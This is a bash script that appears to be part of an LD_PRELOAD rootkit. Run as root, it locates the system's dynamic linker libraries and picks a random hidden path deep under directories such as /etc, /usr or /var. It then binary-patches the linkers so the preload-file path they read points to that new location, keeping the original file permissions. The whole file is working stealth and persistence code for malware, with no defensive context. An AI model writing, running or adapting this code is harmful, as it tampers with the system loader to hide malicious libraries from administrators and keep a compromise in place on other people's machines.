#!/bin/bash

[ $(id -u) != 0 ] || [ -z $1 ] || [ ! -f $1 ] && exit

O_PRELOAD="$1"
LDIRS=("/lib/" "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" "/lib32/" "/libx32/" "/lib64/")
PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")
LLOCS=() # later stores paths of dynamic linker libraries to patch

gldlocs()
{
    for clib in ${LDIRS[*]}; do
        if [ -d "$clib" ]; then # lib directory exists
            local xlib="${clib}*" # /DIRECTORY/*
            for l in $xlib; do [[ $l == *"ld-2"* ]] && LLOCS+=($l); done
        fi
    done
}

# `gnpreload` uses this function to seek a home, for the npreload file, two directories deep
grecurdir()
{
    local cpdir="/notarealdir/"
    while [ ! -d "$cpdir" ]; do
        cpdir="${PDIRS[$RANDOM % ${#PDIRS[@]}]}"
        [ ! -d $cpdir ] && continue
        idirs="$(echo `ls -Ud ${cpdir}*/ 2>&1 | head -8`)" # get 1st 8 dirs in curdir, pipe stderr to stdout
        [[ "$idirs" == *"cannot access"* ]] && continue    # if the cur directory doesn't have any dirs in it, go next
        IFS=' ' read -a idir <<< "$idirs" # read the list of files into an array called idir
        cpdir="${idir[$RANDOM % ${#idir[@]}]}" # pick a random directory from the array
    done
    echo -n $cpdir
}

# builds new location string for the preload file.
gnpreload(){ echo -n "`grecurdir`.`cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 8 | head -n 1`"; }

hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::-2}00" | awk '{print toupper($0)}'; }

patch_lib() # $1=target lib,$2=old preload file,$3=new preload file
{
    local HO_PRELOAD="`hstr $2`" # hex our strings
    local HN_PRELOAD="`hstr $3`"

    # the new preload file string needs to be the same length as the old one,
    # so append nullbytes onto the end of it until it's the same length as the old string.
    while [ ${#HN_PRELOAD} != ${#HO_PRELOAD} ]; do HN_PRELOAD+="00"; done

    if [[ "`strings $1`" == *"$2"* ]]; then
        hexdump -ve '1/1 "%.2X"' $1 | sed "s/$HO_PRELOAD/$HN_PRELOAD/g" | xxd -r -p > $1.tmp
        chmod --reference $1 $1.tmp
        mv $1.tmp $1
    fi
}

N_PRELOAD="`gnpreload`" # generate new preload file location
gldlocs # get full paths of dl libs and store in array
for x in ${LLOCS[*]}; do patch_lib $x $O_PRELOAD $N_PRELOAD; done
echo -n $N_PRELOAD # output the new preload file location
